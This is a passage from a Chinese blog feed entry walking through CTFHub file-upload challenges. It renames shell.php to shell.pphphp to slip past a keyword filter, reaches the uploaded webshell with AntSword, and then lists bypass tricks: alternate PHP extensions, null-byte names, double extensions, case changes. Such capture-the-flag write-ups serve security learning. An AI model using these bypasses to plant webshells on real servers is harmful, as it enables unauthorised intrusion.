src="https://img-blog.csdnimg.cn/20201122171458940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>继续上传<code>shell.php</code>，然后抓包修改成<code>shell.pphphp</code>，中间的php字符串被过滤，剩下的<code>p</code>和<code>hp</code>就组合成了<code>php</code>。</p><p><img src="https://img-blog.csdnimg.cn/2020112217203470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>文件上传成功，得到文件上传路径<br><img src="https://img-blog.csdnimg.cn/2020112217205079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接,flag就在这<br><img src="https://img-blog.csdnimg.cn/20201122172156217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可以通过上传一些平时不怎么用的容易被人忽视的文件扩展名，来绕过这种类型的验证。</p><p><strong>黑名单绕过</strong><br>通过上传不受欢迎的php扩展来绕过黑名单。例如：pht，phpt，phtml，php3，php4，php5，php6</p><p><strong>白名单绕过</strong><br>通过某种类型的技巧来绕过白名单，例如添加空字节注入（shell.php％00.gif），或使用双重扩展来上传文件（shell.jpg.php）。</p><p><strong>扩展名大小写来绕过</strong><br>例如：pHp，Php，phP。</p><p><strong>双写后缀绕过</strong><br>例如：pphphp</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（三）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="http://atkx.top/tags/CTFhub/"/>
    
    <category term="文件上传" scheme="http://atkx.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
</feed>
